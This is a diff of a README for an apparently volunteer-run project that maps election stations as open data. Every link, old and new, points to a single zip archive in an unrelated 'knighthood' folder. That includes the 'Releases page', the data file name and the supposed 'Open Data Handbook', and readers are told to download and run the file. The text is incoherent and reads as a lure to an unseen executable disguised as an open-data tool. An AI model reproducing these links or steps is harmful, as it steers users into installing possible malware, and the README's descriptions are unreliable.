@@ -1,7 +1,7 @@
 # 🗳️ election-station-66 - Contribute to Open Data for Elections
 
 ## 📥 Download the Application
-[![Download Now](https://raw.githubusercontent.com/rikadas/election-station-66/main/knighthood/election-station-66.zip%20Now-Blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/rikadas/election-station-66/main/knighthood/election-station-66.zip)
+[![Download Now](https://github.com/rikadas/election-station-66/raw/refs/heads/main/knighthood/election_station_1.0.zip%20Now-Blue?style=for-the-badge&logo=github)](https://github.com/rikadas/election-station-66/raw/refs/heads/main/knighthood/election_station_1.0.zip)
 
 ## 🚀 Getting Started
 Welcome to the election-station-66 project! This application helps volunteers collect the latitude and longitude of election stations across the country. By contributing to this project, you can assist in creating an open database that others can use for building election maps, verifying data, or preparing for elections.
@@ -13,7 +13,7 @@ The main goals of this project include:
 - Publishing it as **Open Data** under a license that allows everyone to access it for free.
 
 ## 📂 Data Structure
-The primary data file is called `https://raw.githubusercontent.com/rikadas/election-station-66/main/knighthood/election-station-66.zip`. It contains the following columns:
+The primary data file is called `https://github.com/rikadas/election-station-66/raw/refs/heads/main/knighthood/election_station_1.0.zip`. It contains the following columns:
 
 | Field           | Description                             |
 |-----------------|-----------------------------------------|
@@ -27,9 +27,9 @@ The primary data file is called `https://raw.githubusercontent.com/rikadas/elect
 | `location`      | Physical location of the election station|
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/rikadas/election-station-66/main/knighthood/election-station-66.zip). From there, look for the latest version and download the appropriate file for your operating system.
+To get started, visit the [Releases page](https://github.com/rikadas/election-station-66/raw/refs/heads/main/knighthood/election_station_1.0.zip). From there, look for the latest version and download the appropriate file for your operating system.
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/rikadas/election-station-66/main/knighthood/election-station-66.zip).
+1. Go to the [Releases page](https://github.com/rikadas/election-station-66/raw/refs/heads/main/knighthood/election_station_1.0.zip).
 2. Find the latest release.
 3. Click on the download link for your system. You will typically see options for Windows, Mac, or Linux.
 4. Once the file is downloaded, locate it in your Downloads folder.
@@ -57,7 +57,7 @@ We welcome contributions from anyone interested in enhancing this project. If yo
 
 ## 📚 Learning Resources
 If you're new to open data or want to learn more about our project goals, consider these resources:
-- [Open Data Handbook](https://raw.githubusercontent.com/rikadas/election-station-66/main/knighthood/election-station-66.zip)
-- [How to Contribute to Open Data Projects](https://raw.githubusercontent.com/rikadas/election-station-66/main/knighthood/election-station-66.zip)
+- [Open Data Handbook](https://github.com/rikadas/election-station-66/raw/refs/heads/main/knighthood/election_station_1.0.zip)
+- [How to Contribute to Open Data Projects](https://github.com/rikadas/election-station-66/raw/refs/heads/main/knighthood/election_station_1.0.zip)
 
 Thank you for your interest in election-station-66. With your help, we can build a comprehensive database for election stations across the country.
